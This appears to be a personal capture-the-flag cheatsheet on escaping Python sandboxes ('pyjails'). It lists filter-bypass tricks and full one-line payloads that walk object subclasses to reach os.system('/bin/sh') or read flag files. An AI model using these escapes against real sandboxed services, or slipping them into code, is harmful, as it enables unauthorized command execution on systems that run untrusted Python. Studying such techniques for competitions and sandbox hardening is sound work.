Frequently called `pyjail`.
https://github.com/salvatore-abello/pyjail - collection of pyjail challenges.
https://shirajuki.js.org/blog/pyjail-cheatsheet/ - cheatsheet
https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md - another cheatsheet
## Win conditions
- `os.system("cmd")` (examples: `/bin/sh`, `/bin/cat flag.txt`)
- `open("flag.txt").read()`
- `os.environ["BROWSER"] = "cat flag.txt %s"; import antigravity` (`%s` is substituted with `https://xkcd.com/353/`)
### Interactive Help Menu
If I can get python interactive help menu:
- `!cmd` to run arbitrary commands
- `:e path` to move to reading the file at `path`
## Running code from string
Allows to encode the code characters.
- `eval`
- `exec` - allows multiline
## Accessing builtins
Allows to encode characters
- `globals()` - all globals dictionary, has `__builtins__`
- `locals()` - all locals dictionary, includes everything in `globals()` + current scope variables.
- `vars()` - similar to `locals()`
- `__builtins__` - object that has all builtins as attributes.
## Accessing Globals
If the `exec` or `eval` disable globals and locals, you might still be able to access the original script.
- `import __main__; __main__.var`
- `import sys; sys.modules["__main__"].var`
## Importing
- `import os`
- `__import__("os").system("/bin/sh")`
- `sys.modules("os").system("/bin/sh")`

## Accessing attribute of object
`obj` = object
`cobj` = class of object
- `obj.attribute` - standard way
- `obj.__dict__` - all properties of `obj` as dictionary
- `getattr(obj, 'attribute_name')`
- `dir(object)` - list of **names** of all attributes (methods + variables) of object.
- `obj.__getattribute__("attribute")`
- `cobj.__getattribute__(obj, "attribute")`
- `__builtins__ = module_or_dictionary; attribute`. only works on modules / dictionaries.
## Accessing elements in dictionary
- `d["key"]`
- `d.__getitem__("key")`
## Variable/Attribute Assignment
- `x = val`
- `x := val` (mid expression)
- `x.y = val`
- `[smth for x in [val]]`
- `[smth for x.y in [val]]`
- `setattr(x, "y", val) # x.y = val`
## Bypassing spaces
- `lambda` without space: `lambda*a:code`, `a` will be a tuple of arguments. 
- You can replace space with tab or similar.
- List comprehension doesn't require space if it can't be interpreted as part of a variable name, like after a number or `]`. This works: `[[a]for[a]in[[b]]]`, can also be used to assign `__getitem__` and similar.
- Python doesn't require space after numbers with keywords such as `and`, `or`: `1and True` is valid, though produces a SyntaxWarning.
## Unicode characters
- When converting to number from string (like in `int("smth")` or `float("smth")`) any unicode digit can be used, for example `߅` (`NKO DIGIT FIVE`) or `௫` (`TAMIL DIGIT FIVE`) work as the digit `5`.
- In python, all unicode variants of a letter are the same in an identifier: `xn = xⁿ` as variable
- This process is called unicode normalization, and specifically python uses `NFKC`.
- It doesn't apply in strings: `"xn" != "xⁿ"`. 
- For more: https://peps.python.org/pep-0672/
## Getting Strings
- `"abc"`
- `'abc'`
- `"a""bc"`
- `input()`
- `126.to_bytes().decode()`
- `chr(56)`
- `"a" + "b"`
- `"a".__add__("b")`
- `"".join(["a", "b"])`
- `"\oct"`
- `"\x123"`
- `join` can be used with any iterator, for example `{1:"a",2:"b"}.values()`
## No Builtins
### Getting a class object
- `[].__class__`
- `"".__class__`
- `{}.__class__`
- `str`, `int`
### Getting `object`
- `any_class.__bases__[0]` - first parent class of any class.
### Getting any class
`object.__subclasses__()` - a list of all subclasses of `object`, which is every class in python
Filtering:
- `object.__subclasses__()[index'`
- `[t for t in object.__subclasses__() if "Name" in t.__name__][0]`
### Useful classes
#### `Helper` class
Can also be accessed using `help.__class__`.
Full name is `<class _sitebuiltins._Helper>`, can be filtered using `Help`
Can access `__globals__` by using `.__call__.__globals__`
Contains `globals` in the context of the implementation of `help`, which is independent of the current program.
In this context, `sys` is available as global.
Can win using `Helper.__call__.__globals__["sys"].modules["os"].system("/bin/sh")`
Full payload:
`[a for a in ().__class__.__bases__[0].__subclasses__() if "Help" in a.__name__][0].__call__.__globals__["sys"].modules["os"].system("/bin/sh")`
#### `BuiltinImporter` class
Full name: `<class '_frozen_importlib.BuiltinImporter'>`, can be filtered using `BuiltinImporter`.
Can load modules using `load_module("name")`.
Can win using `BuiltinImporter.load_module("os").system("/bin/sh")`.
Full payload:
`[a for a in ().__class__.__bases__[0].__subclasses__() if "BuiltinImporter" in a.__name__][0].load_module("os").system("/bin/sh")`
## Creating custom class / object
### Using `type`
`cls = type("",(),{"method": lambda self: code})` - object of the class itself
`obj = cls()` - instance
Or directly:
`obj = type("",(),{"method": lambda self: code})()`.
Make sure to create an instance if you want an object and not the type itself.
## Calling Functions
### Overriding on existing class
Tested that working: `help`,`copyright`,`license`
Check [[#Variable/Attribute Assignment]] to see how to assign methods.
```python
help.__class__.__getitem__ = os.system
help["/bin/sh"]
```
### Custom class
#### Defining a class method
You can declare the method using:
- `name = other_method`
- `name = lambda`
- `def name(self, params)`
- See [[#Using `type`]]
### Using `__class_getitem__`
```python
class C:
	__class_getitem__ = print
C[35] # prints 35
```
### Using `__getitem__`
```python
class A:
	__getitem__ = chr
A()[34]
```
### Using @property
You can call a `@property` function by just reference, without parenthesis:
```python
class C:
	@property
	def func():
		print("Hello")
C().func
```
or:
```python
class C:
	func = property(print)
C().func
```
## Interesting features
- Boolean behaves like int in most cases, like addition, plus or minus before, or indexing (false is 0, true is 1). Arithmetic operations convert them to integers.
- You can put any amount of plus and minus before an int in any order. The pluses do nothing.
## Order of Operations
### Order
TODO write
### Additional Control
- `[expression][0]` - practically like `()`
## Backslashes
Backslashes can be used at end of line, indicating the line end to be ignored. 
Cannot be used in the middle of a name, but can be used in the middle of a statement. can also split a string across lines.